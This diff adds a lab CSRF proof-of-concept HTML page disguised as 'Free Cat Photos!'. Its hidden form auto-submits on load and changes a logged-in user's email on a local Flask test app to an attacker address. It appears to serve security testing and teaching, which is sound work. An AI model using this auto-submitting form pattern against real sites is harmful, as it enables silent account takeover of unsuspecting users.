@@ -1,0 +1,45 @@
+<!doctype html>
+<!--
+    CSRF Proof-of-Concept - LAB USE ONLY
+
+    This file is a standalone HTML page that represents what an
+    ATTACKER-CONTROLLED website would look like. It is deliberately
+    kept completely OUTSIDE the Flask application (it is never served
+    by app.py / any Flask route) - open it directly as a local file
+    in your browser (double-click it, or drag it into a browser
+    window) while you are separately logged into the lab app at
+    http://127.0.0.1:5000.
+
+    It disguises itself as an innocent page ("Free Cat Photos!") but
+    contains a hidden form that auto-submits, via JavaScript, a POST
+    request to the lab app's /profile/update endpoint the instant
+    this page loads - with no click, no visible interaction, and no
+    warning to the victim.
+
+    Because the browser automatically attaches the lab app's session
+    cookie to ANY request sent to 127.0.0.1:5000 - regardless of
+    which page triggered that request - the lab app has no way to
+    tell this apart from a legitimate request made by the victim
+    themselves from the real /profile page.
+
+    See docs/testing/TC-CSRF-01.md for the full documented test
+    scenario this file is used in.
+-->
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>Free Cat Photos!</title>
+</head>
+<body>
+    <h1>Free Cat Photos!</h1>
+    <p>Totally normal, harmless page. Nothing suspicious here.</p>
+
+    <form id="csrf-form" action="http://127.0.0.1:5000/profile/update" method="POST" style="display:none">
+        <input type="email" name="email" value="hacked-by-csrf@attacker.com">
+    </form>
+
+    <script>
+        document.getElementById('csrf-form').submit();
+    </script>
+</body>
+</html>
